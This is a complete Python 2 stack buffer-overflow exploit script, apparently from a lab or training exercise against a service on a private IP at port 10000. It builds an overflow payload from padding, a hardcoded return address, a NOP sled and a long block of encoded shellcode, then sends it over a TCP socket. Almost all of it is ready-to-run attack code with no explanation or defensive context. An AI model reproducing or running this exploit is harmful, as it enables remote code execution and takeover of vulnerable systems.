#!/usr/bin/python2

import socket
import sys

host = "192.168.70.133"
port = 10000

crash = "A" * 268 
return_address = "\xe7\xe1\x8f\x75" # ASLR need to bypassed
nop_sled = "\x90" * 20
shellcode = (
"\xba\x71\x81\x70\x4c\xdb\xd4\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1"
"\x52\x31\x55\x12\x83\xed\xfc\x03\x24\x8f\x92\xb9\x3a\x67\xd0"
"\x42\xc2\x78\xb5\xcb\x27\x49\xf5\xa8\x2c\xfa\xc5\xbb\x60\xf7"
"\xae\xee\x90\x8c\xc3\x26\x97\x25\x69\x11\x96\xb6\xc2\x61\xb9"
"\x34\x19\xb6\x19\x04\xd2\xcb\x58\x41\x0f\x21\x08\x1a\x5b\x94"
"\xbc\x2f\x11\x25\x37\x63\xb7\x2d\xa4\x34\xb6\x1c\x7b\x4e\xe1"
"\xbe\x7a\x83\x99\xf6\x64\xc0\xa4\x41\x1f\x32\x52\x50\xc9\x0a"
"\x9b\xff\x34\xa3\x6e\x01\x71\x04\x91\x74\x8b\x76\x2c\x8f\x48"
"\x04\xea\x1a\x4a\xae\x79\xbc\xb6\x4e\xad\x5b\x3d\x5c\x1a\x2f"
"\x19\x41\x9d\xfc\x12\x7d\x16\x03\xf4\xf7\x6c\x20\xd0\x5c\x36"
"\x49\x41\x39\x99\x76\x91\xe2\x46\xd3\xda\x0f\x92\x6e\x81\x47"
"\x57\x43\x39\x98\xff\xd4\x4a\xaa\xa0\x4e\xc4\x86\x29\x49\x13"
"\xe8\x03\x2d\x8b\x17\xac\x4e\x82\xd3\xf8\x1e\xbc\xf2\x80\xf4"
"\x3c\xfa\x54\x5a\x6c\x54\x07\x1b\xdc\x14\xf7\xf3\x36\x9b\x28"
"\xe3\x39\x71\x41\x8e\xc0\x12\xae\xe7\x8c\x61\x46\xfa\x10\x77"
"\xcb\x73\xf6\x1d\xe3\xd5\xa1\x89\x9a\x7f\x39\x2b\x62\xaa\x44"
"\x6b\xe8\x59\xb9\x22\x19\x17\xa9\xd3\xe9\x62\x93\x72\xf5\x58"
"\xbb\x19\x64\x07\x3b\x57\x95\x90\x6c\x30\x6b\xe9\xf8\xac\xd2"
"\x43\x1e\x2d\x82\xac\x9a\xea\x77\x32\x23\x7e\xc3\x10\x33\x46"
"\xcc\x1c\x67\x16\x9b\xca\xd1\xd0\x75\xbd\x8b\x8a\x2a\x17\x5b"
"\x4a\x01\xa8\x1d\x53\x4c\x5e\xc1\xe2\x39\x27\xfe\xcb\xad\xaf"
"\x87\x31\x4e\x4f\x52\xf2\x7e\x1a\xfe\x53\x17\xc3\x6b\xe6\x7a"
"\xf4\x46\x25\x83\x77\x62\xd6\x70\x67\x07\xd3\x3d\x2f\xf4\xa9"
"\x2e\xda\xfa\x1e\x4e\xcf"
)
payload = crash + return_address + nop_sled + shellcode

try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((host,port))
        s.send(bytes(payload))
        s.close()
except:
        print("Host is Unreachable")
        sys.exit()
